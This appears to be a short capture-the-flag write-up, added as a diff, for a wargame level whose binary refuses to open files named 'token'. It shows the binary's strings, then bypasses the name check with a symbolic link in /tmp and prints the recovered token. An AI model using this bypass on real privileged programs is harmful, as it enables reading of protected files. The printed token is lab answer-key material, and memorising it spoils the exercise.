@@ -1,0 +1,25 @@
+# cat level09.s
+```
+	.section	.rodata
+.LC0:
+	.string	"%s [file to read]\n"
+.LC1:
+	.string	"token"
+.LC2:
+	.string	"You may not access '%s'\n"
+.LC3:
+	.string	"Unable to open %s"
+.LC4:
+	.string	"Unable to read fd %d"
+	.text
+	.globl	main
+	.type	main, @function
+```
+# we can deduce that they match word "token" and refuse to open it
+# and in the file there are a lot of 'call	strstr'
+# so lets try to do a symnbolic link in /tmp
+```
+level09@BornToSec:/tmp/tom$ ln -s /home/user/level09/token a
+level09@BornToSec:/tmp/tom$ ~/level09 a
+quif5eloekouj29ke0vouxean
+```
